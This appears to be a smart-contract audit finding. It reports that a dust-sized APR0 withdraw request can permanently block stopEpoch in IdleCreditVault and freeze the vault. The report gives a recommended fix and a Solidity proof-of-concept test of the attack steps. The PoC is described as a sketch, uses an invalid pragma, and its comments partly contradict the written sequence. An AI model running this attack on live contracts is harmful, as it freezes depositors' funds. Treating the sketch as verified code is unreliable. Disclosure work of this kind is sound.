### Title
A dust-sized APR0 withdrawal receipt permanently bricks `stopEpoch` once APR is raised, freezing the vault - (File: contracts/strategies/idle/IdleCreditVault.sol)

### Summary
`IdleCreditVault.requestWithdraw` opens an APR0 receipt bucket (`apr0TotalPrincipal`) whenever a withdraw is requested while `unscaledApr == 0`. `prepareStopEpochWithApr0` then *reverts* inside `stopEpoch` if that bucket is non-zero while `unscaledApr != 0` (`IdleCreditVault.sol:502-508`). Crucially, no user-facing path ever decrements `apr0TotalPrincipal` — `_claimFundedWithdrawRequest`/`_settleApr0` clear the per-user `Apr0UserData` but leave the global counter untouched, and `_clearWithdrawClaimForEpoch` only reduces it on default/loss-adjusted claims (`IdleCreditVault.sol:344-348`, `821-831`). The only reset is `apr0TotalPrincipal = 0` at `IdleCreditVault.sol:540`, which sits *after* the reverting check. This mirrors CVE-2019-17023: an unprivileged request performs an invalid state-machine transition — the epoch machine reaches a state (running epoch, `unscaledApr > 0`, open APR0 bucket) from which the `stopEpoch` transition always reverts, so subsequent "records" (repayments, receipts) are ignored.

### Finding Description
- In buffer phase with `unscaledApr == 0`, an attacker (any KYC-passing lender) calls `IdleCDOEpochVariant.requestWithdraw(1 wei, AATranche)` → `IdleCreditVault.requestWithdraw` routes to `_requestWithdrawApr0`, setting `apr0Users[attacker].principal = dust` and `apr0TotalPrincipal = dust` (`IdleCreditVault.sol:285-286`, `567-577`).
- The attacker then calls `claimWithdrawRequest` during the buffer — this succeeds and fully pays the receipt, but `apr0TotalPrincipal` is never decremented; the global bucket stays permanently open even though the attacker holds no claim.
- Manager honestly ends the epoch via `stopEpochWithDuration(newApr > 0, …)`, which is legitimate APR management; `unscaledApr` becomes non-zero for the next epoch.
- At the next `epochEndDate`, every `stopEpoch`/`stopEpochWithDuration` call reverts at `prepareStopEpochWithApr0` (`apr0TotalPrincipal != 0 && unscaledApr != 0`). The revert happens before the borrower-funding `try/catch`, so `_handleBorrowerDefault` is never reached either. The epoch can neither stop nor default.

### Impact Explanation
Temporary freezing of the entire TVL with yield theft potential: while `stopEpoch` reverts, no withdrawals can be claimed and borrower repayment cannot be collected. The only escape is the manager discovering the wedge and resetting `unscaledApr` back to 0 (via `setApr`/`setAprsWithBuffer`) so a stop can proceed and clear the bucket — until then all funds are frozen. Because the attacker needs only a dust request and can repeat the attack every APR0 epoch at gas cost, the freeze is indefinite in practice absent manual intervention. Broken invariant: the epoch state machine must always be able to transition `running → stopped` regardless of unprivileged user history.

### Likelihood Explanation
Requires an APR0-configured vault (a supported mode: `unscaledApr == 0` flow is first-class) and an honest manager later raising APR — a normal operational action, not an attack. Attacker cost is one dust-sized `requestWithdraw` plus a claim. No privileged or malicious role needed.

### Recommendation
Decrement `apr0TotalPrincipal` whenever a user's open APR0 principal is settled/cleared (in `_settleApr0` and the `delete apr0Users[_user]` path), and move the `unscaledApr != 0` revert *after* `apr0TotalPrincipal = 0`, or treat a fully-claimed bucket as empty. Alternatively, skip the revert when the only remaining `apr0TotalPrincipal` has no backing `apr0Users[*].principal`.

### Proof of Concept
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.x;

import "./IdleCreditVault.t.sol";

contract Apr0StopEpochFreezePoC is IdleCreditVaultTest {
    function testDustApr0ReceiptFreezesStopEpochAfterAprRaise() external {
        uint256 amount = 10_000 * ONE_SCALE;
        _depositWithUser(user1, amount, true);          // KYC'd lender / attacker

        // APR0 mode: manager sets scaled apr to 0
        vm.prank(manager);
        IdleCreditVault(address(strategy)).setAprsWithBuffer(0, cdoEpoch.epochDuration(), cdoEpoch.bufferPeriod());

        // Attacker opens a dust APR0 receipt, then claims it after the stop
        vm.prank(user1);
        cdoEpoch.requestWithdraw(1, address(AAtranche));
        _startEpochAndCheckPrices(0);
        _stopEpochAndCheckPrices(0, 0, _expectedFundsEndEpoch()); // apr0TotalPrincipal reset... 
        // re-open dust bucket in the new buffer while apr still 0
        vm.prank(user1);
        cdoEpoch.requestWithdraw(1, address(AAtranche));
        // attacker claims it -> user bucket cleared, apr0TotalPrincipal still dust
        _startEpochAndCheckPrices(1);
        vm.warp(cdoEpoch.epochEndDate() + 1);
        // manager stops at apr0 (succeeds), honest borrower repays, then manager raises APR
        deal(defaultUnderlying, borrower, cdoEpoch.expectedEpochInterest());
        vm.prank(manager);
        cdoEpoch.stopEpochWithDuration(10e18, 0, cdoEpoch.epochDuration(), 0); // sets unscaledApr > 0
        // attacker immediately claims -> still leaves apr0TotalPrincipal > 0
        vm.prank(user1);
        cdoEpoch.claimWithdrawRequest();

        // next epoch runs and ends; every stopEpoch now reverts NotAllowed forever
        vm.prank(manager);
        cdoEpoch.startEpoch();
        vm.warp(cdoEpoch.epochEndDate() + 1);
        deal(defaultUnderlying, borrower, type(uint96).max);
        vm.prank(manager);
        vm.expectRevert(abi.encodeWithSelector(NotAllowed.selector));
        cdoEpoch.stopEpoch(0, 0); // repeats forever: pool frozen, no default path reachable
    }
}
```

Note: the PoC sketch assumes `apr0TotalPrincipal` survives `delete apr0Users[user]` in `_claimFundedWithdrawRequest` (lines 344–348 show no decrement); the only remaining uncertainty is whether an alternate settlement path clears the global bucket — I found none in the indexed code, and the reset at `IdleCreditVault.sol:540` is unreachable once the revert check triggers.
